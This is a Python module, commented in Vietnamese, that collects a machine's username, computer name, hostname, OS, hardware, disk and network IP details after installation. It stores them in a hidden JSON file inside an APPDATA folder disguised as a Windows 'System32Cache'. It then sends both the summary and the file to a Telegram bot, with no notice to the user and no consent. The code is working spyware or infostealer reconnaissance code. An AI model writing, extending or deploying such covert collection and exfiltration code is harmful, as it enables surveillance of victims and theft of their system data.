"""
Module quản lý dữ liệu máy tính đã được cài đặt ứng dụng
Thu thập và gửi thông tin hệ thống
"""
import os
import sys
import platform
import socket
import subprocess
import json
from datetime import datetime
import psutil


class DataManager:
    def __init__(self):
        self.install_dir = os.path.join(
            os.environ.get('APPDATA', ''),
            'Microsoft', 'Windows', 'System32Cache'
        )
        self.data_file = os.path.join(self.install_dir, 'system_data.json')
    
    def get_system_info(self):
        """Thu thập thông tin hệ thống"""
        try:
            # Thông tin cơ bản
            hostname = socket.gethostname()
            username = os.environ.get('USERNAME', 'Unknown')
            computer_name = os.environ.get('COMPUTERNAME', 'Unknown')
            
            # Thông tin hệ điều hành
            os_info = {
                'system': platform.system(),
                'release': platform.release(),
                'version': platform.version(),
                'machine': platform.machine(),
                'processor': platform.processor()
            }
            
            # Thông tin CPU
            cpu_info = {
                'count': psutil.cpu_count(),
                'percent': psutil.cpu_percent(interval=1),
                'freq': psutil.cpu_freq()._asdict() if psutil.cpu_freq() else None
            }
            
            # Thông tin RAM
            memory = psutil.virtual_memory()
            memory_info = {
                'total_gb': round(memory.total / (1024**3), 2),
                'available_gb': round(memory.available / (1024**3), 2),
                'used_gb': round(memory.used / (1024**3), 2),
                'percent': memory.percent
            }
            
            # Thông tin ổ đĩa
            disk_info = []
            for partition in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(partition.mountpoint)
                    disk_info.append({
                        'device': partition.device,
                        'mountpoint': partition.mountpoint,
                        'fstype': partition.fstype,
                        'total_gb': round(usage.total / (1024**3), 2),
                        'used_gb': round(usage.used / (1024**3), 2),
                        'free_gb': round(usage.free / (1024**3), 2),
                        'percent': usage.percent
                    })
                except:
                    pass
            
            # Thông tin mạng
            network_info = []
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        network_info.append({
                            'interface': interface,
                            'ip': addr.address,
                            'netmask': addr.netmask
                        })
            
            # Thông tin cài đặt
            install_info = {
                'install_date': self.get_install_date(),
                'install_path': self.install_dir,
                'python_version': sys.version.split()[0],
                'python_path': sys.executable
            }
            
            # Tổng hợp
            system_data = {
                'timestamp': datetime.now().isoformat(),
                'hostname': hostname,
                'username': username,
                'computer_name': computer_name,
                'os': os_info,
                'cpu': cpu_info,
                'memory': memory_info,
                'disk': disk_info,
                'network': network_info,
                'install': install_info
            }
            
            return system_data
        except Exception as e:
            return {'error': str(e)}
    
    def get_install_date(self):
        """Lấy ngày cài đặt"""
        try:
            if os.path.exists(self.install_dir):
                stat = os.stat(self.install_dir)
                return datetime.fromtimestamp(stat.st_ctime).isoformat()
        except:
            pass
        return datetime.now().isoformat()
    
    def save_data(self, data):
        """Lưu dữ liệu vào file"""
        try:
            with open(self.data_file, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
            # Ẩn file
            import ctypes
            FILE_ATTRIBUTE_HIDDEN = 0x02
            ctypes.windll.kernel32.SetFileAttributesW(
                self.data_file,
                FILE_ATTRIBUTE_HIDDEN
            )
            return True
        except Exception:
            return False
    
    def load_data(self):
        """Đọc dữ liệu từ file"""
        try:
            if os.path.exists(self.data_file):
                with open(self.data_file, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except Exception:
            pass
        return None
    
    def send_data_to_telegram(self, telegram_sender, machine_id=None):
        """Gửi dữ liệu hệ thống qua Telegram"""
        try:
            data = self.get_system_info()
            if 'error' in data:
                return False
            
            # Lưu vào file
            self.save_data(data)
            
            # Tạo message
            machine_header = f"🖥️ Machine: {machine_id}\n\n" if machine_id else ""
            message = f"""{machine_header}🖥️ THÔNG TIN HỆ THỐNG ĐẦY ĐỦ

⏰ Thời gian: {data.get('timestamp', 'Unknown')}

👤 THÔNG TIN NGƯỜI DÙNG:
• Username: {data.get('username', 'Unknown')}
• Computer Name: {data.get('computer_name', 'Unknown')}
• Hostname: {data.get('hostname', 'Unknown')}

📊 HỆ ĐIỀU HÀNH:
• System: {data['os'].get('system', 'Unknown')} {data['os'].get('release', '')}
• Version: {data['os'].get('version', 'Unknown')[:80]}
• Machine: {data['os'].get('machine', 'Unknown')}
• Processor: {data['os'].get('processor', 'Unknown')[:50]}

⚙️ CPU:
• Cores: {data['cpu'].get('count', 'Unknown')}
• Usage: {data['cpu'].get('percent', 0):.1f}%
• Frequency: {data['cpu'].get('freq', {}).get('current', 'N/A') if data['cpu'].get('freq') else 'N/A'} MHz

💾 RAM:
• Total: {data['memory'].get('total_gb', 0)} GB
• Used: {data['memory'].get('used_gb', 0)} GB ({data['memory'].get('percent', 0):.1f}%)
• Available: {data['memory'].get('available_gb', 0)} GB

💿 Ổ ĐĨA:
"""
            for disk in data.get('disk', [])[:5]:  # Lấy 5 ổ đầu
                message += f"• {disk.get('device', 'Unknown')} ({disk.get('fstype', 'Unknown')}):\n"
                message += f"  - Total: {disk.get('total_gb', 0):.1f} GB\n"
                message += f"  - Used: {disk.get('used_gb', 0):.1f} GB ({disk.get('percent', 0):.1f}%)\n"
                message += f"  - Free: {disk.get('free_gb', 0):.1f} GB\n"
            
            message += f"\n🌐 MẠNG:\n"
            for net in data.get('network', [])[:5]:  # Lấy 5 interface đầu
                message += f"• {net.get('interface', 'Unknown')}: {net.get('ip', 'Unknown')} / {net.get('netmask', 'Unknown')}\n"
            
            message += f"\n📦 THÔNG TIN CÀI ĐẶT:\n"
            message += f"• Install Date: {data['install'].get('install_date', 'Unknown')[:19]}\n"
            message += f"• Install Path: {data['install'].get('install_path', 'Unknown')}\n"
            message += f"• Python Version: {data['install'].get('python_version', 'Unknown')}\n"
            message += f"• Python Path: {data['install'].get('python_path', 'Unknown')}\n"
            
            # Gửi message
            if telegram_sender and telegram_sender.bot:
                telegram_sender.send_text_sync(message)
                
                # Gửi file JSON
                if os.path.exists(self.data_file):
                    telegram_sender.send_file_sync(
                        self.data_file,
                        caption="Chi tiết thông tin hệ thống (JSON)"
                    )
                return True
        except Exception:
            pass
        return False
    
    def collect_and_send(self, telegram_sender):
        """Thu thập và gửi dữ liệu"""
        return self.send_data_to_telegram(telegram_sender)


if __name__ == "__main__":
    from telegram_sender import TelegramSender
    
    manager = DataManager()
    sender = TelegramSender()
    
    print("Đang thu thập thông tin hệ thống...")
    data = manager.get_system_info()
    print("Đã thu thập xong!")
    
    print("\nĐang gửi qua Telegram...")
    manager.send_data_to_telegram(sender)
    print("Đã gửi xong!")

